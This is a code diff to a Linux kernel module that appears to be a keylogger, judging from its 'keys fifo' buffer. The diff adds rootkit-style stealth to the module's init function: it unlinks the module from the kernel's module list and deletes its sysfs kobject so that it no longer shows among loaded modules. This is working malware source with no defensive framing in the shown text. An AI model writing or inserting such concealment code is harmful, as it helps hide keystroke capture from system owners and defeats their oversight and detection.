@@ -6,6 +6,7 @@
 #include <linux/fs.h>
 #include <asm/uaccess.h>
 #include <linux/kfifo.h>
+#include <linux/list.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("SpiderPig");
@@ -136,6 +137,10 @@ static void uninitialize_keys_fifo(struct kfifo* fifo)
 static int __init mod_init(void) 
 {
 	printk(KERN_INFO "initializing module\n");
+
+	printk(KERN_INFO "Hiding the module from the modules list.\n");
+	list_del_init(&__this_module.list);
+	kobject_del(&THIS_MODULE->mkobj.kobj);
 
 	printk(KERN_INFO "initializing keys fifo.\n");
 	if (initialize_keys_fifo(&keys_fifo, BUFFER_SIZE)) {
